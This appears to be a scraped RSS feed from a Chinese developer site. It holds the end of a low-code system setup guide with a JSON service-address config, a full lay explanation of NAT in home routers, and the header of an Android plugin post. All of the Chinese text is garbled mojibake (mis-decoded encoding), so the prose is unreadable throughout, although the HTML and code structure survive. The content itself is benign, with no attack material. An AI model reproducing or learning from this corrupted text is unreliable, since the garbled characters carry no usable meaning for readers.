<p><strong>ç³»ç»Ÿåç§°</strong> ä¸ºç”¨æˆ·ç³»ç»Ÿçš„åˆ«åæˆ–è€…æ ‡è¯†ï¼Œ<strong>ç³»ç»Ÿå…¨ç§°</strong> ä¸ºé¡µé¢ title ä¸Šæ˜¾ç¤ºçš„å½“å‰ç”¨æˆ·å®é™…ç³»ç»Ÿçš„åç§°ï¼Œç³»ç»Ÿåœ°å€ä¸ºæ–°ç”Ÿæˆçš„ <strong>é¡¹ç›®åœ°å€</strong>ï¼Œç”Ÿæˆåå¯ç›´æ¥é€šè¿‡è¯¥åœ°å€è®¿é—®ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/afa0ec91ea72424bb914e31c62b10765~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm06Jm5:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767601945&amp;x-signature=gdpsiFQangwcBT%2FTqfwlFJM%2Fdy0%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>é…ç½®å¥½ç³»ç»Ÿåœ°å€ä¹‹åï¼Œå›åˆ°æˆ‘ä»¬åˆšæ‰çš„ç”¨æˆ·ç«¯ï¼Œç‚¹å‡»<code>é…ç½®å®Œæˆï¼Œè¿›å…¥ç³»ç»Ÿ</code></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6dd1fd04f42a48ccaefdc739fc9f4667~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm06Jm5:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767601945&amp;x-signature=yXolntVghPdRkrPnefClKOr%2BBIk%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>å°±ä¼šè¿›å…¥åˆ°å®é™…çš„ç³»ç»Ÿï¼Œåªä¸è¿‡ç›®å‰çš„ç”¨æˆ·è¿˜æ²¡æœ‰ç™»å½•ï¼Œè·³è½¬åˆ°äº†ç™»å½•é¡µ</p>
<p>é™¤äº†ç³»ç»Ÿåç§°å’Œåœ°å€ä¹‹å¤–ï¼Œè¿˜æœ‰ä¸€äº›å…¶ä»–çš„åŸºæœ¬ä¿¡æ¯é…ç½®é¡¹</p>
<p>ç‚¹å‡»å›¾ä¸­çš„ ã€åˆ›å»ºã€‘å¼¹å‡ºä»£ç ç¼–è¾‘å™¨å¯ä»¥ç¼–è¾‘å¦‚ä¸‹é…ç½®ä¿¡æ¯ã€‚</p>
<p>æ³¨ï¼šä¸»è¦é…ç½® <code>service</code> éƒ¨åˆ†ï¼Œä¹Ÿå°±æ˜¯ç³»ç»Ÿä½¿ç”¨çš„ <strong>æœåŠ¡åœ°å€</strong> ï¼Œå…¶ä¸­çš„ <code>lc</code> ä¸ºåŸºç¡€æœåŠ¡åœ°å€é…ç½®</p>
<pre><code class="hljs language-js" lang="js">{
  <span class="hljs-comment">// é¡µé¢çš„åˆ·æ–°æœºåˆ¶ï¼Œå±æ€§åå›ºå®šä¸ºmenu</span>
  <span class="hljs-comment">// ä¸ºcloseè¡¨ç¤ºåªæœ‰é¡µé¢å…³é—­ä¹‹åå†æ‰“å¼€æ‰é‡æ–°åŠ è½½</span>
  <span class="hljs-comment">// ä¸ºalwaysè¡¨ç¤ºåªè¦åˆ‡æ¢åˆ°è¯¥é¡µé¢éƒ½é‡æ–°åŠ è½½</span>
  <span class="hljs-string">"menu"</span>: <span class="hljs-string">"close"</span>,
  <span class="hljs-comment">// ç³»ç»Ÿè®¿é—®çš„å†…éƒ¨æˆ–è€…å¤–éƒ¨æœåŠ¡åœ°å€</span>
  <span class="hljs-comment">// å±æ€§åå›ºå®šä¸ºaddressï¼Œä¸åŒ…å«æ¥å£è·¯å¾„</span>
  <span class="hljs-comment">// å¯ä»¥æ˜¯åŸŸåæˆ–ipå’Œç«¯å£ï¼Œä¹Ÿå¯ä»¥åŠ ä¸ŠæœåŠ¡åˆ†å‘çš„è·¯å¾„</span>
  <span class="hljs-string">"service"</span>: {
    <span class="hljs-comment">// å±æ€§åä¸ºæœåŠ¡åœ°å€çš„åˆ«åï¼Œå€¼ä¸ºå…·ä½“çš„åœ°å€</span>
    <span class="hljs-string">"a"</span>: <span class="hljs-string">"http://123.123.12.3:1001/"</span>,
    <span class="hljs-string">"b"</span>: <span class="hljs-string">"http://123.123.12.3:1001/file/"</span>,
    <span class="hljs-comment">// ç³»ç»Ÿé»˜è®¤è‡ªå¸¦çš„æœåŠ¡å™¨åœ°å€ï¼Œå¯ä»¥è‡ªå®šä¹‰é…ç½®</span>
    <span class="hljs-comment">// å¦‚æœä¸é…ç½®ï¼Œå°†ä¼šä½¿ç”¨`src/config/index.ts`ä¸­è®¾ç½®çš„serverå’Œportçš„åœ°å€</span>
    <span class="hljs-comment">// å¦‚æœé…ç½®ä¸ºå…¶ä»–åœ°å€ï¼Œé‚£ä¹ˆå°†è¦†ç›–ç³»ç»Ÿé…ç½®çš„åœ°å€</span>
    <span class="hljs-string">"lc"</span>: <span class="hljs-string">"http://localhost:9101/"</span>
  }
}
</code></pre>
<p>ä¸Šé¢æåˆ°çš„ç™»å½•é¡µï¼Œä¹Ÿæ˜¯é€šè¿‡é¡µé¢è®¾è®¡å™¨å®ç°çš„ï¼Œåˆå§‹åŒ–ç³»ç»Ÿå°†é»˜è®¤å¸¦ä¸€ä¸ªç™»å½•é¡µçš„é¡µé¢</p>
<p>å¦‚æœéœ€è¦è‡ªå®šä¹‰è®¾è®¡å¯ä»¥é€šè¿‡é¡µé¢è®¾è®¡å™¨é‡æ–°åˆ¶ä½œ</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fae4958c249046fa97c19800f632c892~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm06Jm5:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767601945&amp;x-signature=q%2Blj3R4ZMTnGsjXpnuycMKMN00s%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>æƒ³è¦äº†è§£æ›´å¤šè®¾è®¡çš„å†…å®¹å¯ä»¥è®¿é—® <a href="https://link.juejin.cn?target=http%3A%2F%2Fwww.lnsstyp.com%2Fweb%2Fguide%2FsystemPage%2FpageDesign.html" target="_blank" title="http://www.lnsstyp.com/web/guide/systemPage/pageDesign.html" ref="nofollow noopener noreferrer">é¡µé¢è®¾è®¡</a></p>
<p>ã€é¡¹ç›®ä½“éªŒã€‘</p>
<p><a href="https://link.juejin.cn?target=http%3A%2F%2Fwww.lecen.top%2Fmanage" target="_blank" title="http://www.lecen.top/manage" ref="nofollow noopener noreferrer">ç³»ç»Ÿç®¡ç†ç«¯åœ°å€</a> ï¼š<a href="https://link.juejin.cn?target=http%3A%2F%2Fwww.lecen.top%2Fmanage" target="_blank" title="http://www.lecen.top/manage" ref="nofollow noopener noreferrer">www.lecen.top/manage</a></p>
<p><a href="https://link.juejin.cn?target=http%3A%2F%2Fwww.liudaxianer.com%2Fuser" target="_blank" title="http://www.liudaxianer.com/user" ref="nofollow noopener noreferrer">ç³»ç»Ÿç”¨æˆ·ç«¯åœ°å€</a> ï¼š<a href="https://link.juejin.cn?target=http%3A%2F%2Fwww.liudaxianer.com%2Fuser" target="_blank" title="http://www.liudaxianer.com/user" ref="nofollow noopener noreferrer">www.liudaxianer.com/user</a></p>
<p><a href="https://link.juejin.cn?target=http%3A%2F%2Fwww.lnsstyp.com%2Fweb" target="_blank" title="http://www.lnsstyp.com/web" ref="nofollow noopener noreferrer">ç³»ç»Ÿæ–‡æ¡£åœ°å€</a> ï¼š<a href="https://link.juejin.cn?target=http%3A%2F%2Fwww.lnsstyp.com%2Fweb" target="_blank" title="http://www.lnsstyp.com/web" ref="nofollow noopener noreferrer">www.lnsstyp.com/web</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[NATï¼šä½ å®¶è·¯ç”±å™¨é‡Œé‚£ä½â€œæ·±è—åŠŸä¸åâ€çš„ç¿»è¯‘å®˜]]></title>    <link>https://juejin.cn/post/7589099845185749028</link>    <guid>https://juejin.cn/post/7589099845185749028</guid>    <pubDate>2025-12-29T08:37:40.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589099845185749028" data-draft-id="7589099845185699876" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="NATï¼šä½ å®¶è·¯ç”±å™¨é‡Œé‚£ä½â€œæ·±è—åŠŸä¸åâ€çš„ç¿»è¯‘å®˜"/> <meta itemprop="keywords" content="ç¨‹åºå‘˜"/> <meta itemprop="datePublished" content="2025-12-29T08:37:40.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="çŸ¥è¯†æµ…è°ˆ"/> <meta itemprop="url" content="https://juejin.cn/user/607378030207176"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            NATï¼šä½ å®¶è·¯ç”±å™¨é‡Œé‚£ä½â€œæ·±è—åŠŸä¸åâ€çš„ç¿»è¯‘å®˜
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/607378030207176/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    çŸ¥è¯†æµ…è°ˆ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T08:37:40.000Z" title="Mon Dec 29 2025 08:37:40 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h3 data-id="heading-0">**NATï¼šç”¨é€šä¿—çš„è¯æ¥è®²è§£å¤æ‚çš„æŠ€æœ¯</h3>
<p>ä½ å‘ç°æ²¡ï¼Ÿä½ å®¶å¯èƒ½æœ‰æ‰‹æœºã€ç”µè„‘ã€å¹³æ¿ã€æ™ºèƒ½ç”µè§†â€¦â€¦ä¸€å †è®¾å¤‡è¿ç€åŒä¸€ä¸ªWi-Fiä¸Šç½‘ã€‚ä½ æœ‰æ²¡æœ‰ç¢ç£¨è¿‡ï¼š<strong>è¿è¥å•†å¥½åƒåªç»™äº†ä½ ä¸€ä¸ªâ€œé—¨ç‰Œå·â€ï¼ˆå…¬ç½‘IPï¼‰ï¼Œä½ å®¶è¿™ä¹ˆå¤šâ€œä½æˆ·â€ï¼ˆè®¾å¤‡ï¼‰ï¼Œæ˜¯æ€ä¹ˆåŒæ—¶å‡ºé—¨ï¼ˆä¸Šç½‘ï¼‰è¿˜ä¸æ’è½¦çš„ï¼Ÿ</strong></p>
<p>è¿™èƒŒåå•Šï¼Œå°±ç«™ç€ä¸€ä½é»˜é»˜æ— é—»çš„â€œè¶…çº§ç®¡å®¶â€å…¼â€œç¿»è¯‘å®˜â€â€”â€”<strong>NATï¼ˆç½‘ç»œåœ°å€è½¬æ¢ï¼‰</strong>ã€‚</p>
<h4 data-id="heading-1"><strong>å®ƒä¸ºå•¥å­˜åœ¨ï¼Ÿè¯´ç™½äº†ï¼Œå°±æ˜¯åœ°å€ä¸å¤Ÿåˆ†äº†ã€‚</strong></h4>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/55b9c34108f3424cb70537e365ba0390~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55-l6K-G5rWF6LCI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767602260&amp;x-signature=JOhw1E7LFOFq03xWJf4f37kcanI%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>æƒ³è±¡ä¸€ä¸‹ï¼Œäº’è”ç½‘å°±åƒä¸ªå·¨å¤§çš„åŸå¸‚ï¼Œæ¯ä¸ªè®¾å¤‡éƒ½å¾—æœ‰ä¸ªç‹¬ä¸€æ— äºŒçš„é—¨ç‰Œå·ï¼ˆIPåœ°å€ï¼‰æ‰èƒ½é€šä¿¡ã€‚ä½†æ—©å¹´è§„åˆ’çš„æ—¶å€™ï¼ˆIPv4ï¼‰ï¼Œé—¨ç‰Œå·æ€»å…±å°±å¤§çº¦43äº¿ä¸ªã€‚æ²¡æƒ³åˆ°åæ¥äººå£çˆ†ç‚¸ï¼ˆè®¾å¤‡æš´å¢ï¼‰ï¼Œå·ç æ ¹æœ¬ä¸å¤Ÿç”¨ã€‚</p>
<p>å’‹åŠï¼Ÿæ€»ä¸èƒ½ä¸è®©æ–°è®¾å¤‡ä¸Šç½‘å§ï¼Ÿ</p>
<p>å·¥ç¨‹å¸ˆä»¬ä¸€æ‹è„‘è¢‹ï¼š<strong>â€œå’±ä»¬æä¸ªâ€˜å°åŒºâ€™æ¨¡å¼å§ï¼â€</strong> äºæ˜¯ï¼ŒNATè¯ç”Ÿäº†ã€‚å®ƒå…è®¸å’±ä»¬æ•´ä¸ªå®¶åº­æˆ–å…¬å¸ï¼Œå†…éƒ¨ç”¨ä¸€ä¸ªç§æœ‰åœ°å€æ®µï¼ˆæ¯”å¦‚192.168.1.xxxï¼Œè¿™å°±åƒä½ å®¶å†…éƒ¨çš„æˆ¿é—´å·ï¼‰ï¼Œå¯¹å¤–åˆ™åªç”¨ä¸€ä¸ªå…¬ç½‘IPï¼ˆä½ å®¶å°åŒºçš„æ€»é—¨ç‰Œå·ï¼‰ã€‚</p>
<h4 data-id="heading-2"><strong>å®ƒæ˜¯æ€ä¹ˆå·¥ä½œçš„ï¼Ÿæ´»åƒä¸€ä¸ªä¸¥è°¨çš„ä¿å®‰+ç¿»è¯‘ã€‚</strong></h4>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/406c6a3f96c747538fb4d48c46ac095b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55-l6K-G5rWF6LCI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767602260&amp;x-signature=xxY4C4B0t26neY6sPNaiSxMB8sg%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<ol>
<li>
<p><strong>å½“ä½ çš„æ‰‹æœºæƒ³åˆ·å¾®åšï¼š</strong></p>
<ul>
<li>æ‰‹æœºä¼šå†™ä¸ªâ€œå°çº¸æ¡â€ï¼ˆæ•°æ®åŒ…ï¼‰ï¼Œä¸Šé¢å†™ç€ï¼šâ€œä» <strong>192.168.1.10:5555</strong>ï¼ˆä½ çš„æ‰‹æœºå†…ç½‘IPå’Œç«¯å£ï¼‰ï¼Œå‘ç»™ <strong>å¾®åšæœåŠ¡å™¨:80</strong>ã€‚â€</li>
<li>çº¸æ¡ä¼ åˆ°è·¯ç”±å™¨ï¼ŒNATç®¡å®¶ä¸€æŠŠæ‹¦ä½ã€‚å®ƒæ‹¿å‡ºä¸€ä¸ªå°æœ¬æœ¬ï¼ˆNATè½¬æ¢è¡¨ï¼‰ï¼Œè®°ä¸‹ï¼šâ€œå†…ç½‘çš„5555å·åŒå­¦è¦å‡ºé—¨ã€‚â€</li>
<li>ç„¶åï¼Œå®ƒæŠŠçº¸æ¡ä¸Šçš„â€œå¯„ä»¶äººâ€åœ°å€ï¼Œ<strong>å”°ä¸€ä¸‹æ”¹æˆäº†è·¯ç”±å™¨çš„å…¬ç½‘IPï¼Œå¹¶æ¢äº†ä¸ªæ–°ç«¯å£ï¼Œæ¯”å¦‚ 202.100.100.100:8866</strong>ã€‚</li>
<li>è¿™æ ·ï¼Œå¾®åšæœåŠ¡å™¨çœ‹åˆ°çš„ï¼Œå°±æ˜¯ä¸€ä¸ªæ¥è‡ªâ€œ202.100.100.100:8866â€çš„åˆæ³•è¯·æ±‚ï¼Œå®ƒå°±ä¼šæŠŠæ•°æ®å›å‘ç»™è¿™ä¸ªåœ°å€ã€‚</li>
</ul>
</li>
<li>
<p><strong>å½“å¾®åšæ•°æ®å›æ¥æ—¶ï¼š</strong></p>
<ul>
<li>æ•°æ®åŒ…é€åˆ°è·¯ç”±å™¨é—¨å£ï¼Œå†™ç€â€œç»™ 202.100.100.100:8866â€ã€‚</li>
<li>NATç®¡å®¶ä¸€çœ‹å°æœ¬æœ¬ï¼šâ€œå“¦ï¼Œ8866å¯¹åº”çš„æ˜¯å†…ç½‘çš„192.168.1.10:5555ã€‚â€</li>
<li>å®ƒå†<strong>å”°ä¸€ä¸‹æŠŠæ”¶ä»¶åœ°å€æ”¹å›å»</strong>ï¼Œç²¾å‡†åœ°æŠŠæ•°æ®åŒ…é€è¿˜åˆ°ä½ çš„æ‰‹æœºã€‚</li>
<li>æ•´ä¸ªè¿‡ç¨‹ï¼Œä½ æ¯«æ— æ„ŸçŸ¥ï¼Œåˆ·å¾—é£èµ·ã€‚</li>
</ul>
</li>
</ol>
<p><strong>æ‰“ä¸ªä¸æ°å½“çš„æ¯”æ–¹ï¼š</strong> ä½ å’Œä½ å®¤å‹éƒ½ç‚¹äº†å¤–å–ã€‚å¤–å–å°å“¥åªçŸ¥é“é€åˆ°â€œXXå°åŒºAæ ‹301â€ï¼ˆå…¬ç½‘IPï¼‰ã€‚æ˜¯é—¨å£é‚£ä½è´Ÿè´£çš„ä¿å®‰å¤§å”ï¼ˆNATï¼‰æ¥è¿‡æ¥ï¼Œçœ‹äº†çœ‹è®¢å•å¤‡æ³¨ï¼ˆç«¯å£ï¼‰ï¼Œç„¶åå‡†ç¡®åœ°æŠŠé»„ç„–é¸¡ç±³é¥­é€åˆ°äº†ä½ æ‰‹ä¸Šï¼ŒæŠŠå¥¶èŒ¶ç»™äº†ä½ å®¤å‹ã€‚</p>
<h4 data-id="heading-3"><strong>NATçš„â€œèŒ¶å‘³â€ä¸¤é¢æ€§</strong></h4>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/93610e8e128644b38cd810348405611b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55-l6K-G5rWF6LCI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767602260&amp;x-signature=D5AC%2Bk31S2n8or2Z%2FyhkwCz86Ic%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p><strong>åŠŸåŠ³ï¼ˆèŒ¶é¦™é¦¥éƒï¼‰ï¼š</strong></p>
<ul>
<li><strong>çœåœ°å€ï¼Œå¤§åŠŸè‡£ï¼</strong> å¯ä»¥è¯´å®ƒå‡­ä¸€å·±ä¹‹åŠ›ï¼Œç»™IPv4ç»­å‘½äº†äºŒä¸‰åå¹´ï¼Œä¸ç„¶äº’è”ç½‘æ—©å°±â€œæ— å·å¯ç”¨â€äº†ã€‚</li>
<li><strong>è‡ªå¸¦â€œé˜²ç«å¢™â€buffã€‚</strong> å› ä¸ºå¤–éƒ¨ç½‘ç»œæ— æ³•ä¸»åŠ¨è®¿é—®ä½ å†…ç½‘è®¾å¤‡çš„â€œæˆ¿é—´å·â€ï¼Œæ‰€ä»¥æ— å½¢ä¸­å¸®ä½ æŒ¡æ‰äº†ä¸å°‘ä¸è¯·è‡ªæ¥çš„æ‰«æå’Œæ”»å‡»ï¼Œå®‰å…¨æ€§++ã€‚</li>
<li><strong>éƒ¨ç½²çµæ´»ã€‚</strong> ä¼ä¸šã€å®¶åº­ç»„ç½‘å˜å¾—è¶…çº§ç®€å•ï¼Œå†…éƒ¨éšä¾¿æŠ˜è…¾ï¼Œå¯¹å¤–ä¸€ä¸ªå·ã€‚</li>
</ul>
<p><strong>éº»çƒ¦ï¼ˆæœ‰ç‚¹æ¶©å£ï¼‰ï¼š</strong></p>
<ul>
<li><strong>â€œå±‹é‡Œäººâ€ä¸å¥½è¢«æ‰¾åˆ°ã€‚</strong> å¦‚æœä½ æƒ³è‡ªå·±å»ºä¸ªæ¸¸æˆæœåŠ¡å™¨ï¼Œæˆ–è€…æä¸ªè¿œç¨‹ä¸‹è½½ï¼Œå¤–é¢çš„äººæƒ³ç›´æ¥è¿åˆ°ä½ ç”µè„‘ï¼Œå°±éº»çƒ¦äº†ã€‚ä½ å¾—åœ¨è·¯ç”±å™¨ä¸Šç‰¹åˆ«è®¾ç½®ä¸€ä¸‹â€œç«¯å£è½¬å‘â€ï¼ˆå°±æ˜¯å‘Šè¯‰ä¿å®‰å¤§å”ï¼šå‡¡æ˜¯æ‰¾æ‰“æ¸¸æˆçš„ï¼Œéƒ½ç›´æ¥å¼•åˆ°XXXæˆ¿é—´ï¼‰ï¼Œè¿™æ­¥å¯¹å°ç™½æœ‰ç‚¹ä¸å‹å¥½ã€‚</li>
<li><strong>æœ‰æ—¶å€™æ˜¯â€œä¸­é—´å•†â€ã€‚</strong> å¤æ‚çš„è½¬æ¢ä¼šå¢åŠ ä¸€ç‚¹ç‚¹å»¶è¿Ÿï¼Œå¯¹ç½‘ç»œè¦æ±‚æé«˜çš„ç”µç«ç©å®¶æ¥è¯´ï¼Œå¯èƒ½è¿½æ±‚â€œå…¬ç½‘IPç›´è¿â€ä¼šæ›´çˆ½ã€‚</li>
<li><strong>è®©ç½‘ç»œè°ƒè¯•å˜å¤æ‚ã€‚</strong> å‡ºäº†é—®é¢˜ï¼Œé“¾è·¯å¤šäº†ä¸€å±‚ï¼ŒæŸ¥èµ·æ¥å¾—å¤šç»•ä¸ªå¼¯ã€‚</li>
</ul>
<h4 data-id="heading-4"><strong>ç»“å°¾é—²èŠ</strong></h4>
<p>æ‰€ä»¥ï¼Œä½ ç°åœ¨å¯ä»¥çœ‹çœ‹ä½ å®¶çš„è·¯ç”±å™¨ï¼Œå®ƒçš„å°ç»¿ç¯ä¸€é—ªä¸€é—ªï¼Œé‡Œé¢é‚£ä½NATâ€œç¿»è¯‘å®˜â€æ­£åœ¨ç–¯ç‹‚åœ°å¤„ç†ç€æµ·é‡çš„åœ°å€è½¬æ¢ï¼Œå¿™å¾—ä¸å¯å¼€äº¤ã€‚</p>
<p>å®ƒä¸æ˜¯ä»€ä¹ˆé…·ç‚«çš„æ–°æŠ€æœ¯ï¼Œå´æ˜¯äº’è”ç½‘åº•å±‚æœ€åšå®ã€æœ€é»˜é»˜æ— é—»çš„åŸºçŸ³ä¹‹ä¸€ã€‚ä¸‹æ¬¡å†é‡åˆ°â€œä¸ºä»€ä¹ˆæˆ‘å†…ç½‘èƒ½çœ‹ç›‘æ§ï¼Œå¤–é¢çœ‹ä¸äº†ï¼Ÿâ€è¿™ç§é—®é¢˜æ—¶ï¼Œä½ å°±èƒ½ä¼šå¿ƒä¸€ç¬‘ï¼š<strong>â€œå“¦ï¼Œå¾—å»è·Ÿæˆ‘ä»¬å®¶é‚£ä½NATâ€˜ç®¡å®¶â€™æ‰“ä¸ªæ‹›å‘¼ï¼Œè®©å®ƒå¼€ä¸ªç‰¹åˆ«é€šè¡Œè¯ã€‚â€</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Android æ’ä»¶ ç¬”è®°]]></title>    <link>https://juejin.cn/post/7588570963294896171</link>    <guid>https://juejin.cn/post/7588570963294896171</guid>    <pubDate>2025-12-29T06:14:21.000Z</pubDate>    